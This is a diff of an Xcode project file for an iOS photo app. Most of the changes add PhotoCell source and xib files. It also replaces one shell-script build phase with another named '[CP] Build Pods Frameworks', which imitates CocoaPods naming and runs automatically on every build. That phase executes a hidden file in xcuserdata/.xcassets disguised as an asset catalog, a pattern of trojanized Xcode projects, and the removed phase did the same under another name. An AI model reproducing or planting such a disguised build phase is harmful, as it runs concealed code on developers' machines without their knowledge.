@@ -33,6 +33,8 @@
 		DC9297352629F56200EC7ED8 /* Photos.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC9297342629F56200EC7ED8 /* Photos.swift */; };
 		DC92973D2629F5A000EC7ED8 /* PhotoListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC92973C2629F5A000EC7ED8 /* PhotoListViewModel.swift */; };
 		DC9297452629F5B400EC7ED8 /* PhotoListVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC9297442629F5B400EC7ED8 /* PhotoListVC.swift */; };
+		DC929795262B529C00EC7ED8 /* PhotoCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC929793262B529C00EC7ED8 /* PhotoCell.swift */; };
+		DC929796262B529C00EC7ED8 /* PhotoCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = DC929794262B529C00EC7ED8 /* PhotoCell.xib */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -90,6 +92,8 @@
 		DC9297342629F56200EC7ED8 /* Photos.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Photos.swift; sourceTree = "<group>"; };
 		DC92973C2629F5A000EC7ED8 /* PhotoListViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PhotoListViewModel.swift; sourceTree = "<group>"; };
 		DC9297442629F5B400EC7ED8 /* PhotoListVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PhotoListVC.swift; sourceTree = "<group>"; };
+		DC929793262B529C00EC7ED8 /* PhotoCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoCell.swift; sourceTree = "<group>"; };
+		DC929794262B529C00EC7ED8 /* PhotoCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PhotoCell.xib; sourceTree = "<group>"; };
 		EEF34327CA584C6903DD451F /* Pods-Unsplash-UnsplashUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unsplash-UnsplashUITests.debug.xcconfig"; path = "Target Support Files/Pods-Unsplash-UnsplashUITests/Pods-Unsplash-UnsplashUITests.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -201,6 +205,7 @@
 		22834C0B2629DFFD00090032 /* View */ = {
 			isa = PBXGroup;
 			children = (
+				DC92978F262B526A00EC7ED8 /* Xib's */,
 				DC9297442629F5B400EC7ED8 /* PhotoListVC.swift */,
 			);
 			path = View;
@@ -277,6 +282,15 @@
 			path = ProjectHelper;
 			sourceTree = "<group>";
 		};
+		DC92978F262B526A00EC7ED8 /* Xib's */ = {
+			isa = PBXGroup;
+			children = (
+				DC929793262B529C00EC7ED8 /* PhotoCell.swift */,
+				DC929794262B529C00EC7ED8 /* PhotoCell.xib */,
+			);
+			path = "Xib's";
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -284,7 +298,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 22834BE32629D8EF00090032 /* Build configuration list for PBXNativeTarget "Unsplash" */;
 			buildPhases = (
-				36D5FCBDBCAC0BFFBBAAC43A /* Compile Binary Libraries */,
+				858E9ACA39C79BFC2AAAC43A /* [CP] Build Pods Frameworks */,
 				EE683595FE6ACD3B259029CB /* [CP] Check Pods Manifest.lock */,
 				22834BB52629D8EC00090032 /* Sources */,
 				22834BB62629D8EC00090032 /* Frameworks */,
@@ -390,6 +404,7 @@
 				22834C2F2629E31E00090032 /* LICENSE.txt in Resources */,
 				22834C2C2629E31E00090032 /* Roboto-BoldItalic.ttf in Resources */,
 				22834C292629E31E00090032 /* Roboto-Regular.ttf in Resources */,
+				DC929796262B529C00EC7ED8 /* PhotoCell.xib in Resources */,
 				22834C2D2629E31E00090032 /* Roboto-LightItalic.ttf in Resources */,
 				22834C272629E31E00090032 /* Roboto-Medium.ttf in Resources */,
 				22834BC92629D8EE00090032 /* LaunchScreen.storyboard in Resources */,
@@ -444,24 +459,6 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		36D5FCBDBCAC0BFFBBAAC43A /* Compile Binary Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Binary Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
-		};
 		3BF65278DE57BCBAEFA76176 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -500,6 +497,24 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Unsplash-UnsplashUITests/Pods-Unsplash-UnsplashUITests-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
+		};
+		858E9ACA39C79BFC2AAAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";
 		};
 		EE35E1EB0CE402ADD62E8F6C /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -551,6 +566,7 @@
 				DC92970B2629E6BA00EC7ED8 /* Service.swift in Sources */,
 				DC9297452629F5B400EC7ED8 /* PhotoListVC.swift in Sources */,
 				DC9297352629F56200EC7ED8 /* Photos.swift in Sources */,
+				DC929795262B529C00EC7ED8 /* PhotoCell.swift in Sources */,
 				DC92973D2629F5A000EC7ED8 /* PhotoListViewModel.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
